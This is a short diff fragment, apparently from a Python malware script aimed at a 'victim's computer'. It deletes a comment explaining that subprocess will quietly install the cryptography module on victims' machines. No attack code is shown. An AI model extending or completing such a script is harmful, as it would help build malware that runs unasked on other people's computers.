@@ -17,12 +17,6 @@ o`   'oooo()  | ________   _   _)
   `ooo'   `---'         "-" |_|
 '''
 
-'''
-Import subprocess for executing system commands.
-In this program we'll use it to download the
-cryptography module in case it is not
-already installed on the victim's computer
-'''
 # --> try importing modules
 try:
 	# --> Import subprocess for executing system commands.
